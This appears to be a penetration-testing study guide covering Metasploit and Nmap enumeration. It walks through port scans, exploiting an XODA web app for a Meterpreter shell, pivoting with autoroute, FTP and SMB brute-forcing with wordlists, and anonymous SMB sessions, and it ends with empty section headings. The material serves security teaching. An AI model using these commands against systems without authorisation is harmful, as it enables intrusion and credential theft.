
Table Of Contents
1. Intro to Enumeration
2. Nmap Script
1. [Intro to Enumeration](Enumeration.md#Enumeration)


2. [Nmap Script Engine](Enumeration.md#nse)



FTP Enumeration
SMB Enumeration
Web Server Enumeration
MySQL Enumeration
SSH Enumeration
MTP Enumeration




---
#### Enumeration

Enumeration is the phase that follows host discovery and port scanning in a penetration test. In this step, the goal is to dig deeper and gather detailed information about the systems and services running on a network. This could include things like…

- Account names
- Shared resources
- Misconfigured services.

Just like the scanning phase, enumeration makes active connections to the devices on the network. Attackers typically target misconfigured or unnecessarily enabled protocols during enumeration. The purpose of this phase is to interact with these protocols, with the possibility of exploiting them in later stages of the test.

---
### Port Scanning with Auxiliary Modules

Auxiliary modules in Metasploit are primarily used for tasks like scanning, discovery, and fuzzing, which means gathering information without actually exploiting anything. These modules can scan for open ports and identify services running on those ports, like FTP, SSH, or HTTP, and are useful in both the early information-gathering stage and the post-exploitation phase of a penetration test.

**Why use auxiliary modules when Nmap is available?**
While Nmap is a good for scanning networks but it requires direct access to the internal network, which you won’t always have until you gain control of a system within that network. Transferring Nmap to the internal system is possible but not recommended due to potential security risks and detection.

---
#### Running Port Scan with Metasploit Auxiliary Modules

1. **Start Postgresql and the Metasploit console**: We need postgresql so we can interact with the Metasploit Database. 
	- You can check the status of the database connection status using `db_status`
	- Can create a workspace using `workspace -a <workspace_name>` to save progress
```
service postgresql start && msfconsole
```

2. **Find the Port Scan auxiliary modules** | You can either search metasploit for `portscan` or use the module `auxiliary/scanner/portscan/tcp` .
```
search portscan

use auxiliary/scanner/portscan/tcp
```

3. **Configure the port scan module**: For the portscan aux module, the main setting to set is the target (`RHOSTS`) and the Port(s) to scan on the target with `PORTS`.
	- You can view the different options for a module with `show options`
```
set RHOST target
```

4. **Run the scan**: Just type `run` to run the scan after you're doing with the configurations. You should be be able to view the open ports on the target.
```
run
```

 - **Note**: If you want to run a UDP scan, we’d use the ‘`udp_sweep`’ Module. You can back out, search for the module, just update the RHOST here and run the scan
#### Gaining Initial Access using Metasploit

1. **Find potential attack vectors**: Once a port scan reveals open services, the next step is to try to exploit them for initial access. For example, if port 80 is open, it likely indicates the presence of a web application. Using tools like `curl`, we can retrieve the webpage to gather information about the web application and its services, which might reveal vulnerabilities.
```
curl http://target_IP
```
If the target is running an application like 'XODA'—an open-source, lightweight document management system that functions without a backend database—this could provide an attack vector. We can then search Metasploit for any available exploits targeting XODA, leveraging them to gain access.

2. **Searching exploits in Metasploit**: Since we're focusing on port 80 and know this likely has some kind of web app running, we could try searching metasploit for `xoda` in particular to see if there’s an exploit for the application here. Xoda has the exploit module `exploit/unix/webapp/xoda_file_upload` that can be used here.
```
search xoda

use exploit/unix/webapp/xoda_file_upload
```

3. **Configure and run the exploit**:  This module in particular needs the target (`RHOST`), the target URI/directory location (`TARGETURI`), and your attacking machine's local IP (`LHOST`).
```
set RHOST target

set TARGET URI path

set LHOST your_ip
```

4. **Run the exploit**: Type `exploit` to execute the module. After some time for the exploit to run, the meterpreter session should be available. A Meterpreter session is a payload that provides a cmd-line in Metasploit that gives us control over the target system, allowing us to run commands, perform other post-exploitation tasks like escalate privileges, etc.
```
exploit
```

5. **Drop out of the meterpreter environment / Start shell** | Running the `shell` command in Meterpreter, you exit (or "drop out" of) the Meterpreter environment and start using the target system’s native command-line interface, where you can run commands directly as if you were physically or remotely logged into the machine. If the target is a Linux system you can launch an interactive Bash shell (**`/bin/bash -i`**) which isn't necessary but enables features like tab completion and command history.
```
meterpreter> shell
```

6. **Get the network information of the compromised machine**:  Run `ifconfig`(Linux)/`ipconfig`(Windows) to get the subnet from the target.  If the network information on the adapters is a different subnet this your current machine then its probably what you're looking for.
```
ifconfig
```

#### Pivoting

Pivoting enables attackers to route traffic through a compromised system to access otherwise unreachable networks. In Metasploit, this involves configuring routes to direct traffic from the attacker’s machine through the compromised host to hidden internal systems. Using the target’s private IP information, Meterpreter routes can be set up to explore additional internal machines and services.

1.  **Route tool** (`route add` ) = Provides manual control over adding network routes through a session. You manually specify the target subnet, netmask, and meterpreter session ID to add a route. Can use this when you know the exact subnet you want to reach and need precise control over the routes being configured.
```
route add 192.168.2.0 255.255.255.0 1
```

2.  **Autoroute tool**  (`run autoroute`) = This command adds a manual route to a specific subnet through the current Meterpreter session, similar to `route add`, but it's integrated into the autoroute tool for easier use.  Use this if you know the subnet but prefer a simpler, more Metasploit-integrated way to add it.
```
run autoroute -s 192.168.2.0/24
```

3. **Autoroute Metasploit Module** | `post/multi/manage/autoroute` | The autoroute module finds and automatically adds routes to available networks from a compromised machine's network interface without manually inputting the subnet.  Can use this when you don’t know the connected networks or want a quick, automated way to add all available routes.
```
use post/multi/manage/autoroute
set SESSION 1
run
```


### Host Discovery Scans Using Metasploit

When conducting reconnaissance or pivoting in environments where traditional tools aren't available, Metasploit offers several effective scanning modules for discovering live hosts. These methods minimize noise by targeting specific protocols, enabling quick identification of active machines.

1. **TCP Ping Sweep**: The `auxiliary/scanner/discovery/tcp_ping` module sends a **TCP SYN** packet to a specific port on multiple hosts. A **SYN/ACK** or **RST** response indicates that the host is active. This is an effective way to perform host discovery without running a complete port scan. This scan is useful when you know or suspect certain ports are available and can use them to determine which hosts are live.
```
use auxiliary/scanner/discovery/tcp_ping
set RHOSTS <target subnet>
set RPORT 80  # Can also be set to 443, 22, or other open ports
run
```

2. **ICMP Sweep:** The `auxiliary/scanner/discovery/icmp_sweep` module sends **ICMP echo requests (pings)** to determine if hosts are live. This scan works well in networks that allow ICMP traffic, but results may be limited if ping requests are blocked. This approach resembles a traditional ping sweep, providing quick feedback on which hosts respond.
```
use auxiliary/scanner/discovery/icmp_sweep
set RHOSTS <target subnet or IP range>
run
```

3. **ARP Sweep:** The `auxiliary/scanner/discovery/arp_sweep` module sends **ARP requests** to discover active hosts on the same subnet. Since ARP operates at the link layer, it isn't blocked by most firewalls, making it an effective tool for local network reconnaissance. This method is highly effective when you are within the same network segment as the target hosts, ensuring reliable discovery.
```
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <target subnet>
run
```

**Now, you can perform another portscan. We’ll need to change the receiving port of the port scan to the assumed target.**

---

## FTP Enumeration

FTP (File Transfer Protocol) is a TCP-based protocol using port 21 for file sharing between a server and client, commonly used for transferring files to and from web server directories. It can be enumerated or brute-forced using auxiliary tools, and while it typically requires a username and password for authentication to the FTP server, some misconfigured servers allow anonymous access. We’re generally looking for.

- Version of FTP
- Brute Force to find username/password
- Check for anonymous logins

---
##### Check FTP Version

The `auxiliary/scanner/ftp/ftp_version` auxiliary module can check for the ftp version of a service:
1. **Find and use the module**: Either search for the module '`search type:auxiliary name:ftp` ' or just use the module.
```
search type:auxiliary name:ftp

use auxiliary/scanner/ftp/ftp_version
```

2. **Configure and run the ftp version scan** | We  need to update the target `RHOSTS` but the default config is fine here. The default FTP password and username is provided but its not required. 
```
set RHOSTS 192.168.2.41
```

3. **Run the scan**: Enter `run` to run the scan. You can see the version of the FTP server through its banner. We can use this to find vulnerabilities for that software and its version. 
```
run
```

---
##### Running a FTP Brute Force

The FTP Authentication Scanner auxiliary module  (`auxiliary/scanner/ftp/ftp_login`) can  perform a brute force attack on the FTP server. The strength of the attack is dependent on the word list used.
1. **Find and use the module**: Either search for the module '`search type:auxiliary name:ftp` ' or just use the module.
```
search type:auxiliary name:ftp

use auxiliary/scanner/ftp/ftp_login
```

2. **Configure the module**: Set the RHOST, we’ll then need to either 1. Provide a `PASSWORD` or `USERNAME` to test or 2. provide a password file and username file. Metasploit provides a great wordlist so we’ll choose to import the files and set them `USER_FILE` and `PASS_FILE`.
	
	- Metasploit Users List Location = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- Metasploit Password List Location = `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

3. **Run the scanner**:  Enter `run` to run the scanner. Give it some time for the scanner to work, any valid credentials should display if theres a match.

##### FTP Anonymous Login

The `auxiliary/scanner/ftp/anonymous` auxiliary module can check for anonymous login with the ftp:

1. **Find and use the module**: Either search for the module '`search type:auxiliary name:ftp` ' or just use the module.
```
search type:auxiliary name:ftp

use auxiliary/scanner/ftp/anonymous
```

2. **Configure and run the ftp version scan**: We need to update the target `RHOSTS` but the default config is fine here. The default FTP password and username is provided but its not required. 
```
set RHOSTS 192.168.2.41
```

#### Login to FTP Server

You can use the FTP client utility to initiate an FTP session with the target. Use `ftp` and specify the target ip/hostname to connect. This command assumes that an FTP service is running on the target machine and listening for incoming connections on port 21. You should be prompted for a username and password to authenticate your access.

```
ftp <target>
```

**Helpful tips:** 
- `ls` = View directory
- `get <file_name.type>` = To download a file, should download to home directory by default

---
## SMB 

SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (like printers) between computers on a local network (LAN). SMB uses port 445 (TCP). It operates over TCP port 445, enabling network clients to interact with server resources. However, originally, SMB ran on top of NetBIOS using port 139. The primary function of SMB is to facilitate resource sharing, but misconfigured shares or outdated versions can expose sensitive data or allow unauthorized access.

SMB has both a service-level and share-level authentication where it can authenticate on different levels. The credentials you use need to be an actual user on that target system or domain. Normally, when you attempt to access a share and it prompts you to login in, this is can be treated as both the authentication at the share-level (\\Server\Share) and also against the smb service.

SMB exists in different versions. SMBv2 and SMBv3 are part of the Windows operating system by default and are generally enabled as long as file sharing or network discovery is enabled. SMBv1 is an older version known for vulnerabilities like the EternalBlue exploit. SMBv1 is disabled by default in Windows 10 and newer versions due to security concerns. However, you can enable or disable SMB versions like SMBv1 through Windows Features.

- **To check or enable SMB features**:
    - Go to **Control Panel > Programs > Turn Windows features on or off**.
    - In the dialog that appears, scroll down to find "SMB 1.0/CIFS File Sharing Support" and check or uncheck it to enable or disable SMBv1.

##### Guest Access

Guest access in SMB allows anonymous users to connect to shared resources without requiring authentication. This poses a significant security risk because unauthorized users can potentially access files or directories with little to no restriction.

In SMB, guest access can occur at two distinct levels: the service level and the share level. At the **service level**, guest access enables unauthenticated queries to the SMB service. Tools like Nmap can leverage this access to enumerate available shares, users, or supported protocols, even without valid credentials. The system treats the guest account as an anonymous login, providing limited access to metadata about the service and network configuration.

At the **share level**, guest access allows users to access specific shared folders, such as a Public directory, which might be intentionally open to all. However, more sensitive shares—such as administrative shares like C$—require elevated credentials, typically from an administrator or a privileged user. 

**Administrative Shares on Windows**

Administrative shares are hidden network shares automatically created by Windows for administrative purposes, allowing remote access to important drives and system folders. These shares are identified by a dollar sign (`$`) at the end of the share name, making them hidden from standard network browsing. Examples include
- `C$` (the root of the C: drive)
- `ADMIN$` (the Windows directory)
- `IPC$` (for inter-process communication)

These shares are primarily used for remote management tasks, file transfers, and troubleshooting. Only accounts with administrative privileges can access them.
#### IPC Share

The IPC$ (Inter-Process Communication) share is a special administrative share in Windows systems that facilitates communication between processes or applications over a network using the SMB protocol. While it isn’t accessible like standard shared folders in Windows Explorer, it plays a vital role in enabling remote communication and operations. Tools like Nmap, Metasploit can interact with the IPC$ share to enumerate network resources assisting with:
- **Enumerating network shares** (e.g., `C$`, Admin$) and identifying accessible directories.
- **Querying system information** (e.g., users, groups, and services), which provides insight into accounts or misconfigurations.
- **Providing a remote interface for commands**, such as those issued through `net use` or `net rpc`.\

When enumerating, it would be helpful to view the permissions of the IPC$ share since it can provides a clear indication of what an unauthenticated user can potentially do on the system's shared resources. 
### SMB Enumeration

SMB enumeration involves several key tasks aimed at uncovering information about the server’s configuration and resources:
- **Discover SMB Version**: Identify the supported SMB protocol version, which can indicate potential vulnerabilities or deprecated versions that are still in use.
- **Locate Available Resources (Shares)**: Enumerate all shared resources to see what files or directories the server is exposing.
- **Assess Share Permissions**: Evaluate the permissions on each share to detect misconfigurations that may allow unauthorized access.
- **Monitor Active User Sessions**: Identify current user sessions to understand who is connected and possibly gain insights into user activity.
- **Evaluate Security Measures**: Investigate how security is managed, such as checking whether guest access is enabled or disabled.

We can utilize Metasploit auxiliary modules and Nmap NSE scripts to enumerate the SMB version, shares, users and perform a brute-force attack etc. The Metasploit modules can be found with the search utility specifying the type as auxiliary and the 'smb' for the name:  `search type:auxiliary name:smb` , you could see some of the smb NSE scripts by searching the `/usr/share/nmap/scripts` directory and using an `ls` command to the `grep`  command.
```
ls -al /usr/share/nmap/scripts | grep -e “smb”
```
##### SMB Brute Force

The smb_login auxiliary module (`auxiliary/scanner/smb/smb_login`) that can be used to perform a brute force against the SMB service to hopefully get valid credentials. The default options for the scanner should be fine but we can set either wordlist files for both users or passwords > `USER_FILE (users) | PASS_FILE (pwds) USERPASS_FILE (Both)` or we can set individual accounts/pwds with `SMBUser`/`SMBPass`. Metasploit does provide wordlists that we can use here.

- Metasploit Users List Location = `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- Metasploit Password List Location = `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
        
```
use auxiliary/scanner/smb/smb_login
set RHOSTS [target]
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

##### SMB: Credentialed vs Un-credentialed Scans

When running SMB scans, the presence or absence of valid credentials can significantly affect the results. If valid credentials are available, it’s always recommended to use them for more thorough SMB enumeration. An uncredentialed scan relies on public or guest access, but if guest login is disabled, many probes will result in **access denied** errors. In contrast, a **credentialed scan** uses valid user credentials, allowing deeper access and more detailed information from the target SMB service.

- **NMap** :  Credentials can be added to Nmap SMB scripts by passing the username (`smbusername`) and password (`smbpassword`) via the `--script-args` option.
```
nmap -p445 --script=smb-enum-services --script-args smbusername=[user],smbpassword=[password] [target]
```

- **Metasploit**: In Metasploit, the credentials are supplied by setting the `SMBUser` and `SMBPass` options for the scanner.`
```
set SMBUser <username>
set SMBPass <password>
```

##### SMB: Enumerate  SMB Version/ Protocols & OS

Several scripts from Nmap and an Metasploit module that can be used to identify the SMB versions, protocols, and OS details of a target system. This includes the Nmap NSE scripts `smb-protocols` and `smb-os-discovery`, as well as the Metasploit module `smb_version` (`auxiliary/scanner/smb/smb_version`).

- **NMap** – `smb-protocols`: This NSE script checks which SMB dialects (e.g., SMBv1, SMBv2, SMBv3) are supported by the server. It’s helpful for quickly identifying outdated versions like SMBv1, which is associated with known vulnerabilities such as EternalBlue.
```
nmap -p445 --script smb-protocols [target]
```

- **NMap – `smb-os-discovery`**: The script performs OS fingerprinting via the SMB service and attempts to gather detailed information about the target’s OS version, computer name/NetBIOS computer name, domain etc.
```
nmap -p445 --script smb-os-discovery [target]
```

- Metasploit – `smb_version` Module:  The smb_version module attempts to identify the SMB version in use like the smb-protocols NSE script and can also provide additional OS-related information (Windows build version or service pack etc) like the smb-os-discovery NSE script.
```
use auxiliary/scanner/smb/smb_version
set rhosts [IP]
run
```

Using these tools together provides a more complete picture: `smb-protocols` and `smb_version` help identify the SMB protocols in use, while `smb-os-discovery` and `smb_version` give insight into the target system's OS and build information.

- Note: If you see A NetBIOS name with `\x00`, this is a null terminator, a special character used to indicate the end of the string in the NetBIOS protocol. The null terminator isn't part of the name itself but is included for formatting in NetBIOS communication.

##### SMB Security level

The Nmap NSE script `smb-security-mode` evaluates the security configuration of the SMB server. It determines if the server enforces security practices, such as SMB signing, and whether plaintext passwords or older authentication mechanisms are allowed.
```
nmap -p445 --script smb-security-mode [target]
```
- **User-level authentication**: Each user logs in with a unique username/password. This is the standard modern configuration.
- **Share-level authentication**: Access is granted to shared resources using a common password. This older method is vulnerable to sniffing and is rarely used today.
- **Challenge/response support**: Indicates whether the server accepts more secure password types (e.g., NTLM/LM) or only plaintext passwords, with plaintext being vulnerable to interception.
- **Message signing**: If required, it ensures all communications between client and server are cryptographically signed to prevent man-in-the-middle (MITM) and SMB relay attacks. Servers that don’t enforce signing may be exploited through negotiation attacks where signing is disabled.

##### SMB: Enumerate Logged in Users

The NSE script `smb-enum-sessions` enumerates logged-in user sessions on the SMB server connected through an through an SMB share. It can help detect unauthorized or misconfigured access (like guest accounts).
```
nmap -p445 --script smb-enum-sessions [target]
```
##### SMB: Enumerate Network/File Shares

There’s an Nmap NSE script `smb-enum-shares`  and the Metasploit smb_enumshares auxiliary module (`auxiliary/scanner/smb/smb_enumshares`) for enumerating shared folders and drives on the target system.  The shares  may contain valuable files along with any permission misconfigurations. Using an authenticated scan allows access to shares that might not be visible otherwise.
- **NMap**: Combine `smb-enum-shares` with the `smb-ls` script to list files within each shared folder.
```
nmap -p445 --script smb-enum-shares [target]
```
```
nmap -p445 --script smb-enum-shares,smb-ls [target]
```

- **Metasploit**:  The **smb_enumshares** module identifies and enumerates SMB shares on the target system. Enabling the `ShowFiles` option provides additional details about the contents of the shared resources, which can help identify files.
```
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [IP]
set ShowFiles true
run
```
##### SMB: Enumerate User Accounts

There's an Nmap NSE `smb-enum-users` and the Metasploit SMB_enumusers auxiliary module (`auxiliary/scanner/smb/smb_enumusers`) for enumerating users on the target. Make sure to copy down all of the users and any possible admin accounts.

- **NMap**:
```
nmap -p445 --script smb-enum-users [target]
```

- **Metasploit**: The **smb_enumusers** scanner will connect to each system via the SMB RPC service and enumerate the users on the system.
```
use auxiliary/scanner/smb/smb_enumusers
set rhosts [IP]
run
```
##### SMB Group Enumeration

The Nmap NSE script `smb-enum-groups` script retrieves a list of user groups on the SMB server and users apart of those groups. It helps identify users with elevated privileges or roles that might be exploited.
```
nmap -p445 --script smb-enum-groups [target]
```
##### SMB Server Statistics

The Nmap NSE script `smb-server-stats` retrieves statistical information from the SMB server, including failed login attempts, file locks, and other activity-related details. This can help in analyzing security events or detecting abnormal behavior.
```
nmap -p445 --script smb-server-stats [target]
```

##### SMB Enumerate Domains

The Nmap NSE script `smb-enum-domains` enumerates domains available on the SMB server, which is important when targeting a domain controller to discover domain structures.
```
nmap -p445 --script=smb-enum-domains [target]
```

##### SMB Enumerate Services

Nmap NSE script `smb-enum-services` can enumerate services on the target. The list which can reveal misconfigured or vulnerable services that could be exploited.
```
nmap -p445 --script=smb-enum-services [target]
```

##### SMB Access Shares  

The **SMBClient** is a command-line utility that allows interaction with SMB shares on remote servers. It is particularly useful for accessing Windows file shares from a Linux environment.

When using SMB paths, keep in mind that double backslashes (`\\`) are required to escape special characters in the shell. A typical SMB path like `\\192.51.254.3` must be written as `\\\\192.51.254.3\\` in the command line to be interpreted correctly. You can provide a username with the `-U` option, and the utility will prompt for the password upon connection.

- **List Available Shares**:  Use the **`-L` option** to list all shares on the target server. If credentials are required, you will be prompted for a password after entering the username.
```
smbclient -L \\\\192.168.56.2\\ -U admin
```

- **Access a Specific Share**:  Connect directly to a share using the network path. After connecting, you can download files using the `get` command. By default, downloaded files will be saved to your current working directory on the local machine (likely /home/).
```
smbclient \\\\192.168.56.2\\share -U admin
```

- **Download a File from the Share**:
```
get flag
```

#### SMB Anonymous Connection (Null Session)  

Anonymous (or null session) connections allow access to certain SMB resources without authentication. By testing with null sessions, you can determine if the target allows unauthenticated access, which could expose shares or RPC services.

- **smbclient**: Use the `-N` option to bypass the password prompt, attempting an anonymous login. If shares are displayed without a password requirement, it confirms that anonymous connections are allowed.
```
smbclient -L [target] -N
```

- **rpcclient**: This command-line tool allows interaction with Windows RPC (Remote Procedure Call) services over SMB, enabling queries of user accounts, shares, and domain controller details. Using `-U ""` specifies an empty username, indicating an anonymous login, and `-N` tells `rpcclient` to skip the password prompt to not provide credentials.
```
rpcclient -U "" -N [target]
```


##### SAMBA

SAMBA is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices. The `smbd` process is for Samba. It handles file and printer sharing, user authentication, and network communication between Unix/Linux systems and SMB clients, typically in Windows environments. The `nmbd` process in Samba manages NetBIOS name resolution and network browsing, allowing systems to discover and communicate with each other on local networks using NetBIOS over IP.

- UPD Port 137 (netbios-ns) is used for NetBIOS Name Service, which handles name resolution and registration, allowing devices on a network to identify each other by name.
- UPD Port 138 (netbios-dgm) is used for NetBIOS Datagram Service, supporting communication for broadcasting messages across the network, typically for tasks like group messaging or network browsing.

Network browsing allows devices on a local network to view and access shared resources dynamically as they become available on the network.





The `-sV` would return the workgroup name of the samba server







## Web Server Enumeration
## MySQL Enumeration
## SSH Enumeration
## SMTP Enumeration